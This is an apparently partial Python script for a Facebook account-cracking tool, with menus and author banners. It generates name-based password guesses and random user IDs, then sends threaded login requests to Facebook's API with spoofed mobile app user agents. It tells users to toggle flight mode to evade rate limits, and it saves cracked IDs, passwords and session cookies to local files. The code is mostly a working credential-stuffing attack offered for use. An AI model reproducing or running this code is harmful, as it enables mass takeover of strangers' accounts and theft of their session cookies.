...
os.system('espeak -a 300 " SYSTEM CRACKING,"')
...
if bit == '64bit':
 print(f'\x1b[38;5;160m[\033[1;37m●\x1b[38;5;160m]\x1b[38;5;46m LOADING........\n')
elif bit == '32bit':
...
{G}██      ██ ██   ██ ██   ██ ██ ██      ██
──────────────────────────────────────────────────
{R}[{A}●{R}]{G} FACEBOOK          {R}[{A}●{R}]{G} SHEIKH MAHIM
{R}[{A}●{R}]{G} OWNER             {R}[{A}●{R}]{G} SHEIKH MAHIM
──────────────────────────────────────────────────""")
...
def menu():
        try:
              #  approval()
                        clear()
                        print(f'{R}[{A}●{R}] {R}[{A}1{R}]{G} FACEBOOK CLONE [HACK] \n{R}[{A}●{R}] {G}{R}[{A}2{R}]{G} FREE FIRE HACK')
                        linex()
                        xd=input(f'{R}[{A}●{R}] {R}[{A}={R}]{G} CHOICE : ')
                        if xd in ['1','01']:
                                clear();print(f'{R}[{A}●{R}] {G}EXAMPLE {R}[{A}THE TOOLS PAID PRICE 600 TAKA{R}]');linex()
                                file = input(f'{R}[{A}?{R}]{G} SORY BRO THIS TOOLS PAID: ')
                                try:
                                        ...
                                        menu()
                                clear()
                                print(f'{R}[{A}1{R}]{G} METHOD {R}[{A}M1{R}]\n{R}[{A}2{R}]{G} METHOD {R}[{A}M2{R}]\n{R}[{A}3{R}]{G} METHOD {R}[{A}M3{R}]\n{R}[{A}4{R}]{G} METHOD {R}[{A}M4{R}]');linex()
                                mthd=input(f'{R}[{A}?{R}]{G} CHOICE : ')
                                clear()
                                plist = []
                                print(f'                  PASSWORD SYSTEM');linex();print(f'{R}[{A}1{R}]{G} AUTO PASSWORD CLONE\n{R}[{A}2{R}]{G} CHOICE PASSWORD CLONE');linex()
                                ppp=input(f'{R}[{A}?{R}]{G} CHOICE : ')
                                if ppp in ['1','01']:
                                        plist.append('first1')
                                        ...
                                        plist.append('first last@')
                                        plist.append('@first@123')
                                        plist.append('First First Last')                                        
                                        plist.append('57273200')                                
                                else:
                                        try:
                                                clear()
                                                ps_limit = int(input(f'{R}[{A}●{R}] {G}PASSWORD LIMIT : '))
                                        except:
                                                ps_limit =1
                                        clear()
                                        print(f'{R}[{A}●{R}] {G} EXAMPLE : firstlast{A}/{A}first@@{A}/{A}first123 ')
                                        linex()
                                        for i in range(ps_limit):
                                                plist.append(input(f'{R}[{A}●{R}] {G}PASSWORD NO {i+1} :{A} '))
                                clear()
                                print(f'{R}[{A}●{R}] {G}CP ID SHOW (y/n) ')
                                linex()
                                cx=input(f'{R}[{A}?{R}]{G} CHOICE : ')
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        ...
                                        print(f'{R}[{A}●{R}] {G}TOTAL ACCOUNT {A}●{A} '+total_ids+f' {A}●{G} METHOD :{A} F{mthd}')
                                        print(f'{R}[{A}●{R}] {G}PLEASE EVERY 5 MIN {R}[{A}ON/OF{R}]{G} YOUR FLIGHT MODE')
                                        linex()
                                        for user in fo:
                                ...
                                print('\033[1;37m')
                                print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
                                print(f'{R}[{A}●{R}]{G} THE PROCESS HAS COMPLETED')
                                print(f'{R}[{A}●{R}]{G} TOTAL OK/CP : '+str(len(oks))+'/'+str(len(cps)))
                                print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
...
def randm():
    clear()
    print(f'{R}[{A}1{R}]{G} SORY BRO THE TOOLS PAID ')
    print(f'{R}[{A}0{R}]{G} BACK TO MENU ');linex()
    option=input(f'{R}[{A}?{R}]{G} CHOICE : ')
    if option in ['1','A']:
        bd()
    elif option in ['2','B']:
    	india()
...
def bd():
		user=[]
		clear()
		print(f'{R}[{A}●{R}]{G} EXAMPLE : PRICE 600 BDT ');linex()
		code = input(f'{R}[{A}?{R}]{G} CHOICE  : ')
		clear();print(f'{R}[{A}●{R}]{G} EXAMPLE : PLZ BUY THE TOOLS ');linex()
		limit = int(input(f'{R}[{A}?{R}]{G} CHOICE  : '))
		clear()
		print(f'{R}[{A}1{R}]{G} SORY {R}[{A}M1{R}]{G} \n{R}[{A}2{R}]{G} SORY {R}[{A}M2{R}]{G}\n{R}[{A}3{R}]{G} SORY {R}[{A}M3{R}]{G} ');linex()
		mthd = input(f'{R}[{A}?{R}]{G} PRICE 600 BDT  : ')
		for nmbr in range(limit):
			nmp=''.join(random.choice(string.digits) for _ in range(8))
			user.append(nmp)
		with tred(max_workers=90) as habib:	
			clear()
			tl = str(len(user))
			print(f'{R}[{A}●{R}]{G} YOUR CLONING SIM CODE :{A} {code} ')
			print(f'{R}[{A}●{R}]{G} YOUR CLONING TOTAL UID :{A} {tl} ')
			print(f'{R}[{A}●{R}]{G} PLEASE EVERY 5 MIN {R}[{A}ON/OF{R}]{G} YOUR FLIGHT MODE');linex()
			for psx in user:
				uid = code+psx
		...
		print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		print(f'{R}[{A}●{R}]{G} THE PROCESS HAS COMPLETED')
		print(f'{R}[{A}●{R}]{G} TOTAL OK ID : '+str(len(oks)))
		print(f'{R}[{A}●{R}]{G} TOTAL CP ID : '+str(len(cps)))
		print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		input(f'{R}[{A}●{R}]{G} PRESS ENTER TO BACK ')
		menu()
...
def api1(ids,names,passlist):
        try:
                global oks,cps,loop
                sys.stdout.write(f'\r{R}[{A}●{R}] {R}[{A}ATIK-F1{R}] {R}[{A}%s{R}] {G}OK {R}[{A}●{R}] {G}CP {R}[{A}%s{R}] {A}[%s] '%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        ua = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";'[FBAN/FB4A;FBAV/284.0.0.50.107;FBBV/239634218;FBDM/{density=1.75,width=1225,height=775};FBLC/en_GB;FBRV/239918289;FB_FW/2;FBCR/Wifi;FBMF/Realme;FBBD/realme;FBPN/com.facebook.katana;FBDV/RMX3706;FBSV/11.5.4;FBOP/1;FBCA/x86_64:arm64-v8a:armeabi-v7a;]"
                        ...
                        if 'session_key' in po:
                                        ...
                                        print(f"\r\r{G}[{G}COOKIE{G}]>{G} "+coki)
                                        open('/sdcard/ATIK-M1-OK.txt', 'a').write(ids+' | '+pas+' |-> '+coki+"\n")
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r{Y}[{Y}ATIK-2F{Y}]{Y} '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/ATIK-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                break
...
"x-fb-connection-token":"d29d67d37eca387482a8a5b740f84f62"}
                        ...
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print(f'\r\r{G}[{G}ATI-OK{G}]{G} '+ids+f' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
...
def rndm1(uid,passlist):
        ...
        try:
                for pas in passlist:
                        ...
                        ua = '[FBAN/FB4A;FBAV/387.0.0.24.102;FBPN/com.facebook.katana;FBLC/fr_CA;FBBV/317416518;FBCR/Fizz Mobile;FBMF/Samsung;FBBD/samsung;FBDV/SM-A025F;FBSV/14.8.0;FBCA/x86_64:armeabi-v7a;FBDM/{density=2.2,width=916,height=1550};FB_FW/1;]'                      
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        ...
                        if 'session_key' in po:
                                        ...
                                        if 'y' in pcp:
                                                print(f'\r\r{R}[{Y}ATIJ-CP{R}]{Y} '+uid+' | '+pas+'\033[1;97m')
...
def rndm2(uid,passlist):
        ...
        try:
                for pas in passlist:
                        ...
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print(f'\r\r{R}[{A}ATIK-OK{R}]{G} '+uid+f' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f"\r\r{G}[{G}COOKIE{G}]>{A} "+coki)
                                        open('/sdcard/ATIK-M2-OK.txt', 'a').write(uid+' | '+pas+' |-> '+coki+"\n")
                                        oks.append(uid)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r{R}[{A}ATIK-CP{R}]{Y} '+uid+' | '+pas+'\033[1;97m')
